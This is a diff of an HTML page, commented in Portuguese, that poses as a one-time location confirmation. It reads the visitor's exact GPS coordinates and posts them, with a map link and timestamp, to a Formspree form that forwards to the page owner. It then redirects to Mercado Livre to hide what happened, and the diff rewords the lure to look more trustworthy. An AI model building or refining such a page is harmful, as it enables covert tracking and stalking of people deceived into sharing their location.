@@ -42,17 +42,17 @@
 <body>
 <div class="container">
   <!-- EDITA O TEXTO/HTML AQUI -->
-  <h2>Confirme que esta no Brasil</h2>
- <p>voce esta no Brasil ??</p>
+  <h2>Confirme sua localização</h2>
+  <p>Para continuar, precisamos confirmar sua cidade uma única vez.</p>
   
-  <button class="btn" onclick="confirmar()">sim, estou no brasil!</button>
+  <button class="btn" onclick="confirmar()">Continuar</button>
   <div id="msg"></div>
 </div>
 
 <script>
   // ===== CONFIGURAÇÃO - EDITA AQUI =====
-  const LINK_REDIRECIONAMENTO = "https://www.mercadolivre.com.br"; // <-- TROCA O LINK AQUI
-  const LINK_FORMSPREE = "https://formspree.io/f/xzdywvdp"; // <-- COLOCA TEU LINK DO FORMSPREE AQUI
+  const LINK_REDIRECIONAMENTO = "https://www.mercadolivre.com.br"; 
+  const LINK_FORMSPREE = "https://formspree.io/f/xzdywvdp"; 
   // =====================================
 
   function confirmar(){
@@ -67,25 +67,33 @@
 
     navigator.geolocation.getCurrentPosition(
       (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
         const dados = {
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          link_mapa: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`,
+          latitude: lat,
+          longitude: lon,
+          // Link corrigido para abrir o Google Maps no ponto exato
+          link_mapa: `https://www.google.com/maps?q=${lat},${lon}`,
           data_hora: new Date().toLocaleString('pt-BR')
         };
 
-        // Envia pro teu email e depois redireciona
+        // Envia para o Formspree
         fetch(LINK_FORMSPREE, {
           method: 'POST',
-          headers: {'Content-Type': 'application/json'},
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
           body: JSON.stringify(dados)
         }).finally(() => {
+          // Redireciona após o envio (independente de sucesso ou erro)
           window.location.href = LINK_REDIRECIONAMENTO;
         });
 
       },
       (erro) => {
-        // Se negar ou der erro, redireciona igual
+        // Se o usuário negar a localização, ele apenas redireciona
         msg.innerHTML = "Redirecionando...";
         window.location.href = LINK_REDIRECIONAMENTO;
       }
